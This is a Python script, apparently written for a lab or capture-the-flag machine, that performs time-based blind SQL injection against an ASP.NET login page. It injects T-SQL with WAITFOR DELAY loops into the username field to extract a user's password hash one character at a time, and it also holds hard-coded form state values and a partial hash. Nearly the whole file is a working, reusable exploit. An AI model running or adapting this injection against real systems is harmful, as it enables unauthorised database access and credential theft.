#!/usr/bin/python3
import requests
import time
def main():
	char_index = 33
	hash_index = 0
#	E7B2B06DD8ACDED117D6D075673274C4ECDC75A788E09E81BFFD84F11AF6267
	hash = ""
	post_data = {
		"__VIEWSTATE": "/wEPDwUKLTQ0NDEwMDQ5Mg9kFgJmD2QWAgIDD2QWAgIBD2QWAgIHDw8WAh4EVGV4dAUeSW52YWxpZCB1c2VybmFtZSBvciBwYXNza2V5Li4uZGRkikLoDB+/pXdQqiz9h+j5nHjE4OqEYro7hz/kDYh48fQ=",
		"__VIEWSTATEGENERATOR": "CA0B0334",
		"__EVENTVALIDATION": "/wEdAAQ5uNqOYHbIeyi7LRhe1+7mG8sL8VA5/m7gZ949JdB2tEE+RwHRw9AX2/IZO4gVaaKVeG6rrLts0M7XT7lmdcb69X6Gyh7W5UwTVXhfLT4lC/UYzzbo01YDuyOekjcuLek=",
		"ctl00$ContentPlaceHolder1$UsernameTextBox": "",
		"ctl00$ContentPlaceHolder1$PasswordTextBox": "",
		"ctl00$ContentPlaceHolder1$LoginButton": "Enter"
	}

	#payload = f"' DECLARE @index INT SET @index = 65 DECLARE @var AS varchar (50) SELECT @var = (SELECT password_hash FROM users WHERE username='BUTCH'); WHILE (@index <= 126) BEGIN IF(SUBSTRING(@var,{char_index},1) = CHAR(@index)) BREAK; ELSE BEGIN WAITFOR DELAY '0:0:1' END SET @index = @index + 1 END--"
# CLEAN FUCKING PAYLOAD:
	# 'DECLARE @index INT SET @index = 65 DECLARE @var AS varchar (50) SELECT @var = (SELECT password_hash FROM users WHERE username='BUTCH'); WHILE (@index <= 126) BEGIN IF(SUBSTRING(@var,1,1) = CHAR(@index)) BREAK; ELSE BEGIN WAITFOR DELAY '0:0:1' END SET @index = @index + 1 END--
		# THIS WILL WAIT 4 SECONDS BECAUSE FIRST CHARACTER OF THE HASH IS APPARENTLY 'E'


#how to know if r.elapsed < 30s? DONE
# Found hash length to be 61 chars... But brute force is showing at least 63...

	while(char_index < 126):
		UsernameTextBox_dynamic=f"'DECLARE @index INT SET @index = {char_index} DECLARE @var AS varchar (130) SELECT @var = (SELECT password_hash FROM users WHERE username='BUTCH'); WHILE (@index <= 126) BEGIN IF(SUBSTRING(@var,{hash_index},1) = CHAR(@index)) BREAK; ELSE BEGIN WAITFOR DELAY '0:0:1' END SET @index = @index + 1 END--"
		post_data["ctl00$ContentPlaceHolder1$UsernameTextBox"] = UsernameTextBox_dynamic
		print(f"Current payload params are: char_index: {char_index} AND hash_index: {hash_index}")
		r = requests.post('http://192.168.202.63:450', data=post_data)
		# THANKS STACK OVERFLOW <3
		delta = int(r.elapsed.total_seconds())
		print("delta: " + str(delta))
		if delta < 30:
			hash += chr(char_index + delta)
			print(f"!!!! Found a char for position {hash_index} !!!!\nTotal: " + hash)
			hash_index += 1
			# reset char index if changed
			char_index = 33
		else:
			if hash_index == 61:
				print("That should be it! HASH IS: " + hash)
				break;
			print("Not found in char range... Increase char_index by 30!")
			char_index += 30

if __name__ == '__main__':
	main()


